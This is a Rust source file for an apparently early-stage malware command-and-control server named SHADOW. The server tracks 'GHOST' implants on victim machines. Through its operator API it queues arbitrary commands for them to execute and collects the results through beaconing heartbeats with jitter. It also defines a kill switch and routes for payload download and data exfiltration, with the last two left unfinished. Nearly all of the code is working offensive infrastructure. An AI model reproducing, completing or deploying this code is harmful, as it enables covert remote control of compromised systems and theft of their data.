use axum::{
    extract::{State, Path, Query},
    routing::{get, post},
    Json, Router
};
use dashmap::DashMap;
use serde::{Deserialize, Serialize};
use std::{net::SocketAddr, sync::Arc};
use uuid::Uuid;

// GENERAL CONCEPT
// server will handle implants
// each implant has some identifying properties
// -> for now they will be very generic
// each implant can get tasks
// each implant can send back its state
// -> generalize that into a message for now

// === STRUCTS ===
#[derive(Debug, Clone, Serialize, Deserialize)]
struct Ghost {
    id: String,         // UUID v7
    hostname: String,   // system hostname of machine on which the implant resides
    os: String,         // operating system, for now we'll just send correct implant, TODO to automatically detect OS and send correct implant
    last_seen: i64      // unix timestamp
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct Task {
    id: String,         // UUID v7
    command: String,    // exact command to be executed on target system
    args: String,       // arguments for the above command
    status: String,     // current status: "pending", "sent", "done"
    result: Option<String>
}

#[derive(Deserialize)]
struct HeartbeatRequest {
    id: String,
    results: Option<Vec<TaskResult>>
}

#[derive(Deserialize)]
struct TaskResult {
    task_id: String,
    status: String,
    output: String
}

#[derive(Serialize)]
struct HeartbeatResponse {
    sleep_interval: i64,
    jitter: i64,
    tasks: Option<Vec<TaskDefinition>>
}

#[derive(Serialize)]
struct TaskDefinition {
    id: String,
    command: String,
    args: String
}

#[derive(Deserialize)]
struct TaskRequest {
    command: String,
    args: String
}

// === SHARED STATE ===
struct ServerState {
    ghosts: DashMap<String, Ghost>,
    tasks: DashMap<String, Vec<Task>>
}

// === API handlers ===
// GHOST
async fn handle_ghost_register(
    State(state): State<Arc<ServerState>>,
    Json(mut ghost): Json<Ghost>
) -> Json<String> {
    println!("GHOST registered: {} ({})", ghost.hostname, ghost.id);

    ghost.last_seen = chrono::Utc::now().timestamp();
    state.ghosts.insert(ghost.id.clone(), ghost);

    Json("ACK".to_string())
}

async fn handle_ghost_heartbeat(
    State(state): State<Arc<ServerState>>,
    Json(req): Json<HeartbeatRequest>
) -> Json<HeartbeatResponse> {
    if let Some(mut ghost) = state.ghosts.get_mut(&req.id) {
        ghost.last_seen = chrono::Utc::now().timestamp();
    } else {
        println!("ERROR unknown GHOST {} sent heartbeat", req.id);
    }

    if let Some(results) = req.results {
        if let Some(mut tasks) = state.tasks.get_mut(&req.id) {
            for r in results {
                if let Some(task) = tasks.iter_mut().find(|t| t.id == r.task_id) {
                    println!("task {} completed by GHOST {}", r.task_id, req.id);
                    task.status = r.status;
                    task.result = Some(r.output);
                }
            }
        }
    }

    let mut outgoing_tasks = Vec::new();

    if let Some(mut tasks) = state.tasks.get_mut(&req.id) {
        for task in tasks.iter_mut().filter(|t| t.status == "pending") {
            outgoing_tasks.push(TaskDefinition {
                id: task.id.clone(),
                command: task.command.clone(),
                args: task.args.clone()
            });

            task.status = "sent".to_string();
        }
    }

    let response = HeartbeatResponse {
        sleep_interval: 5,
        jitter: 1,
        tasks: if outgoing_tasks.is_empty() { None } else { Some(outgoing_tasks) }
    };

    Json(response)
}

async fn handle_ghost_file_download(Path(id): Path<String>) {
    todo!("placeholder file download")
}

async fn handle_ghost_upload() {
    todo!("ghost exfiltration todo")
}

// CHARON
async fn handle_charon_list_ghosts(State(state): State<Arc<ServerState>>) -> Json<Vec<Ghost>> {
    let list: Vec<Ghost> = state.ghosts.iter().map(|e| e.value().clone()).collect();
    Json(list)
}

async fn handle_charon_get_ghost(
    Path(id): Path<String>,
    State(state): State<Arc<ServerState>>
) -> Json<Option<Ghost>> {
    let ghost = state.ghosts.get(&id).map(|e| e.value().clone());
    Json(ghost)
}

async fn handle_charon_queue_task(
    Path(id): Path<String>,
    State(state): State<Arc<ServerState>>,
    Json(req): Json<TaskRequest>
) {
    let new_task = Task {
        id: Uuid::now_v7().to_string(),
        command: req.command,
        args: req.args,
        status: "pending".to_string(),
        result: None
    };

    println!("task {} queued for GHOST {}", new_task.id, id);

    state.tasks.entry(id).or_insert_with(Vec::new).push(new_task);
}

async fn handle_charon_kill_ghost(
    Path(id): Path<String>,
    State(state): State<Arc<ServerState>>
) {
    let kill_task = Task {
        id: Uuid::now_v7().to_string(),
        command: "STOP HAUNT".to_string(),  // magic command for implant to interpret, TODO: think about it
        args: "".to_string(),
        status: "pending".to_string(),
        result: None
    };

    println!("kill signal queued for GHOST {}", id);

    state.tasks.entry(id).or_insert_with(Vec::new).push(kill_task);
}

#[tokio::main]
async fn main() {
    // init shared state
    let state = Arc::new(ServerState {
        ghosts: DashMap::new(),
        tasks: DashMap::new()
    });

    let ghost_routes = Router::<Arc<ServerState>>::new()
        .route("/register", post(handle_ghost_register))        // ghost init (register)
        .route("/heartbeat", post(handle_ghost_heartbeat))      // ghosts will beacon to get tasks from here (or will just beacon their status and get back whether or not they have a task; smth to think about)
        .route("/files/{id}", get(handle_ghost_file_download))   // payload/implant download point
        .route("/upload", post(handle_ghost_upload));           // exfiltration endpoint for data dumps

    let charon_routes = Router::<Arc<ServerState>>::new()
        .route("/ghosts", get(handle_charon_list_ghosts))           // list active GHOSTs
        .route("/ghosts/{id}", get(handle_charon_get_ghost))         // get details about a GHOST
        .route("/ghosts/{id}/task", post(handle_charon_queue_task))  // assign a task to GHOST
        .route("/ghosts/{id}/kill", post(handle_charon_kill_ghost)); // killswitch for GHOST

    // init router with route -> handler mapping
    let app = Router::<Arc<ServerState>>::new()
        .route("/health", get(|| async { "OK" }))       // simple healthcheck for docker compose if it happens
        .nest("/api/v1/ghost", ghost_routes)
        .nest("/api/v1/charon", charon_routes)
        .with_state(state);

    // start listening
    let addr = SocketAddr::from(([0, 0, 0, 0], 9999));  // TODO: adress and port configuration via CHARON (NOTE: is this still necessary in Docker? or maybe a separate mechanism would suffice?)
    let listener = tokio::net::TcpListener::bind(addr).await.unwrap();
    
    println!("SHADOW listening on {}", addr);
    axum::serve(listener, app).await.unwrap();
}
